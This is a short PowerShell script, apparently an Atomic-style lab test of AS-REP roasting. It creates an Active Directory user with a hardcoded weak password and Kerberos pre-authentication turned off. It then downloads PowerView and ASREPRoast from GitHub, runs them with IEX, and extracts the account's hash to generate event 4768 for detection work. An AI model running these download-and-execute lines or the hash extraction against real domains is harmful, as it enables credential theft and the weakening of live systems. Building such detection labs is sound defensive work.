## --- Parameters ---
$Username = "test_asrep"
$Domain = "corp.local" 
$Password = "Password123!"

## --- Create user ---
New-ADUser -Name $Username `
           -SamAccountName $username `
           -UserPrincipalName "$Username@$Domain" `
           -GivenName "Test" `
           -Surname "ASREP" `
           -Enabled $true `
           -AccountPassword (ConvertTo-SecureString $Password -AsPlainText -Force) `
           -PassThru

# --- Turn off Kerberos pre-auth ---
Set-ADAccountControl -Identity "test_asrep" -DoesNotRequirePreAuth $true

## --- Atomic Test #2: Get-DomainUser with PowerView ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing)

## --- !!! Exploitation step (generates 4768) !!! ---
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1')
Get-ASREPHash -UserName $Username -Domain $Domain